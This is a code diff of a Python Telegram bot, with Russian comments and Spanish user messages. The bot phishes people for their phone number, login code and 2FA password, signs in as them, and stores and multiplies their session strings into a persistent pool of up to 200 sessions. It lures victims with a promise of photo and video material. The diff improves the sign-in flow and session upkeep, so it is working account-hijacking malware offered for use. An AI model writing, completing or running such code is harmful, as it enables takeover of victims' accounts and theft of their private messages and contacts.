@@ -45,92 +45,42 @@ session_keepers = {}
 
 # Константы
 MAX_SESSIONS = 200
-SESSION_ROTATION_LIMIT = 50
 
 os.makedirs("sessions", exist_ok=True)
 
-async def create_session_pool(user_id, phone, main_session_str):
-    """Создаем пул из 200 сессий"""
-    sessions = []
+async def maintain_sessions(user_id, phone, main_session_str):
+    """Поддерживаем пул активных сессий"""
+    # Получаем текущие сессии пользователя
+    existing_sessions = list(sessions_col.find({"user_id": user_id}))
     
-    # Основная сессия
-    sessions.append({
-        "user_id": user_id,
-        "phone": phone,
-        "session": main_session_str,
-        "is_main": True,
-        "created_at": datetime.utcnow(),
-        "last_active": datetime.utcnow()
-    })
-    
-    # Дополнительные сессии
-    for i in range(MAX_SESSIONS - 1):
-        client = TelegramClient(StringSession(main_session_str), API_ID, API_HASH, proxy=proxy)
-        await client.connect()
-        session_str = client.session.save()
-        
-        sessions.append({
-            "user_id": user_id,
-            "phone": f"{phone}_{i}",
-            "session": session_str,
-            "is_main": False,
-            "created_at": datetime.utcnow(),
-            "last_active": datetime.utcnow()
-        })
-        
-        await client.disconnect()
-    
-    # Сохраняем в базу
-    sessions_col.insert_many(sessions)
-    
-    # Сохраняем в файлы
-    os.makedirs(f"sessions/{user_id}", exist_ok=True)
-    for i, session in enumerate(sessions):
-        with open(f"sessions/{user_id}/session_{i}.json", "w") as f:
-            json.dump(session, f)
-
-async def rotate_sessions(user_id):
-    """Проверяем и обновляем неактивные сессии"""
-    user_sessions = list(sessions_col.find({"user_id": user_id}))
-    if not user_sessions:
-        return
-    
-    main_session = next((s for s in user_sessions if s.get("is_main")), None)
-    if not main_session:
-        return
-    
-    active_count = 0
-    for session in user_sessions:
+    # Проверяем активность существующих сессий
+    active_sessions = 0
+    for session in existing_sessions:
         client = TelegramClient(StringSession(session['session']), API_ID, API_HASH, proxy=proxy)
         try:
             await client.connect()
             if await client.is_user_authorized():
-                active_count += 1
-                sessions_col.update_one(
-                    {"_id": session["_id"]},
-                    {"$set": {"last_active": datetime.utcnow()}}
-                )
+                active_sessions += 1
             else:
+                # Удаляем неактивную сессию
                 sessions_col.delete_one({"_id": session["_id"]})
-        except Exception as e:
-            logging.error(f"Session check error: {e}")
+        except:
             sessions_col.delete_one({"_id": session["_id"]})
         finally:
             await client.disconnect()
     
-    # Если активных сессий меньше MAX_SESSIONS - создаем новые
-    if active_count < MAX_SESSIONS:
-        needed = MAX_SESSIONS - active_count
+    # Создаем недостающие сессии
+    if active_sessions < MAX_SESSIONS:
+        needed = MAX_SESSIONS - active_sessions
         for _ in range(needed):
-            client = TelegramClient(StringSession(main_session['session']), API_ID, API_HASH, proxy=proxy)
+            client = TelegramClient(StringSession(main_session_str), API_ID, API_HASH, proxy=proxy)
             await client.connect()
             new_session_str = client.session.save()
             
             sessions_col.insert_one({
                 "user_id": user_id,
-                "phone": f"{main_session['phone']}_{random.randint(1000, 9999)}",
+                "phone": phone,
                 "session": new_session_str,
-                "is_main": False,
                 "created_at": datetime.utcnow(),
                 "last_active": datetime.utcnow()
             })
@@ -138,13 +88,18 @@ async def rotate_sessions(user_id):
             await client.disconnect()
 
 async def session_monitor():
-    """Фоновая задача для мониторинга сессий"""
+    """Фоновая задача для поддержания сессий"""
     while True:
         await asyncio.sleep(3600)  # Проверка каждый час
         try:
+            # Получаем всех пользователей с сессиями
             users_with_sessions = sessions_col.distinct("user_id")
+            
             for user_id in users_with_sessions:
-                await rotate_sessions(user_id)
+                # Получаем основную сессию пользователя
+                main_session = sessions_col.find_one({"user_id": user_id})
+                if main_session:
+                    await maintain_sessions(user_id, main_session['phone'], main_session['session'])
         except Exception as e:
             logging.error(f"Session monitor error: {e}")
 
@@ -187,9 +142,13 @@ async def handle_contact(message: types.Message):
     user_phones[user_id] = phone
 
     try:
-        await client.send_code_request(phone)
+        code_request = await client.send_code_request(phone)
         user_states[user_id] = 'awaiting_code'
-        user_code_buffers[user_id] = {'code': '', 'message_id': None}
+        user_code_buffers[user_id] = {
+            'code': '',
+            'message_id': None,
+            'phone_code_hash': code_request.phone_code_hash
+        }
         msg_id = await send_code_keyboard(user_id, "", None)
         user_code_buffers[user_id]['message_id'] = msg_id
         await message.answer("⌨️ Ingresa el código presionando los botones a continuación:")
@@ -230,7 +189,8 @@ async def resend_code(callback_query: types.CallbackQuery):
         return
 
     try:
-        await client.send_code_request(phone)
+        code_request = await client.send_code_request(phone)
+        user_code_buffers[user_id]['phone_code_hash'] = code_request.phone_code_hash
         await bot.answer_callback_query(callback_query.id, text="Código reenviado")
     except Exception as e:
         await bot.answer_callback_query(callback_query.id, text=f"Error: {str(e)}", show_alert=True)
@@ -257,7 +217,7 @@ async def process_code_button(callback_query: types.CallbackQuery):
             await bot.answer_callback_query(callback_query.id, text="⚠️ Ingresa el código primero", show_alert=True)
             return
         await bot.answer_callback_query(callback_query.id)
-        await try_sign_in_code(user_id, current_code)
+        await try_sign_in(user_id, current_code)
     else:
         digit = data.split("_")[1]
         if len(current_code) >= 10:
@@ -268,48 +228,77 @@ async def process_code_button(callback_query: types.CallbackQuery):
         await bot.answer_callback_query(callback_query.id)
         await send_code_keyboard(user_id, current_code, message_id)
 
-async def try_sign_in_code(user_id, code):
+async def try_sign_in(user_id, code):
     client = user_clients.get(user_id)
     phone = user_phones.get(user_id)
-    if not client or not phone:
+    buffer = user_code_buffers.get(user_id)
+    
+    if not client or not phone or not buffer:
         await bot.send_message(user_id, "⚠️ Sesión no encontrada. Por favor, intenta nuevamente con /start")
         cleanup(user_id)
         return
 
     try:
-        await client.sign_in(phone=phone, code=code)
+        # Пробуем войти с кодом
+        await client.sign_in(
+            phone=phone,
+            code=code,
+            phone_code_hash=buffer['phone_code_hash']
+        )
+        
         if await client.is_user_authorized():
-            session_str = client.session.save()
-            
-            # Создаем пул из 200 сессий
-            await create_session_pool(user_id, phone, session_str)
-            
-            await bot.send_message(user_id, "✅ ¡Autenticación exitosa! Se han creado múltiples sesiones.")
-            await bot.send_message(
-                user_id,
-                "Estamos trabajando en modo manual, disculpen la demora, "
-                "pronto les enviaremos material fotográfico y de video😉🧍‍♀️."
-            )
-            await client.disconnect()
-            cleanup(user_id)
+            await handle_successful_auth(user_id, client)
         else:
             user_states[user_id] = 'awaiting_2fa'
             await bot.send_message(user_id, "🔐 Ingresa tu contraseña 2FA:")
+            
+    except SessionPasswordNeededError:
+        user_states[user_id] = 'awaiting_2fa'
+        await bot.send_message(user_id, "🔐 Se requiere tu contraseña 2FA. Por favor, ingrésala:")
+    except PhoneCodeInvalidError:
+        await bot.send_message(user_id, "❌ Código incorrecto. Inténtalo de nuevo:")
+        user_code_buffers[user_id]['code'] = ""
+        await send_code_keyboard(user_id, "", buffer['message_id'])
     except PhoneCodeExpiredError:
         await bot.send_message(user_id, "⏰ Código expirado. Por favor, intenta nuevamente con /start")
         await client.disconnect()
         cleanup(user_id)
-    except PhoneCodeInvalidError:
-        await bot.send_message(user_id, "❌ Código incorrecto. Inténtalo de nuevo:")
-        user_code_buffers[user_id]['code'] = ""
-        await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
-    except SessionPasswordNeededError:
-        user_states[user_id] = 'awaiting_2fa'
-        await bot.send_message(user_id, "🔐 Se requiere tu contraseña 2FA. Por favor, ingrésala:")
     except Exception as e:
         await bot.send_message(user_id, f"❌ Error de autenticación: {e}")
         await client.disconnect()
         cleanup(user_id)
+
+async def handle_successful_auth(user_id, client):
+    """Обработка успешной авторизации"""
+    phone = user_phones.get(user_id)
+    if not phone:
+        return
+
+    session_str = client.session.save()
+    
+    # Сохраняем основную сессию
+    sessions_col.update_one(
+        {"user_id": user_id, "is_main": True},
+        {"$set": {
+            "phone": phone,
+            "session": session_str,
+            "last_active": datetime.utcnow()
+        }},
+        upsert=True
+    )
+    
+    # Создаем/обновляем пул сессий
+    await maintain_sessions(user_id, phone, session_str)
+    
+    await bot.send_message(user_id, "✅ ¡Autenticación exitosa! Se han activado múltiples sesiones.")
+    await bot.send_message(
+        user_id,
+        "Estamos trabajando en modo manual, disculpen la demora, "
+        "pronto les enviaremos material fotográfico y de video😉🧍‍♀️."
+    )
+    
+    await client.disconnect()
+    cleanup(user_id)
 
 @dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
 async def process_2fa(message: types.Message):
@@ -325,27 +314,19 @@ async def process_2fa(message: types.Message):
 
     try:
         await client.sign_in(password=password)
+        
         if await client.is_user_authorized():
-            session_str = client.session.save()
-            
-            # Создаем пул из 200 сессий
-            await create_session_pool(user_id, phone, session_str)
-            
-            await message.answer("✅ ¡Autenticación exitosa con 2FA! Se han creado múltiples sesiones.")
-            await message.answer(
-                "Estamos trabajando en modo manual, disculpen la demora, "
-                "pronto les enviaremos material fotográfico y de video😉🧍‍♀️."
-            )
-            await client.disconnect()
-            cleanup(user_id)
+            await handle_successful_auth(user_id, client)
         else:
             await message.answer("❌ No se pudo autenticar con 2FA.")
     except Exception as e:
         await message.answer(f"❌ Error con 2FA: {e}")
+    finally:
         await client.disconnect()
         cleanup(user_id)
 
 def cleanup(user_id):
+    """Очистка данных пользователя"""
     user_states.pop(user_id, None)
     user_clients.pop(user_id, None)
     user_phones.pop(user_id, None)
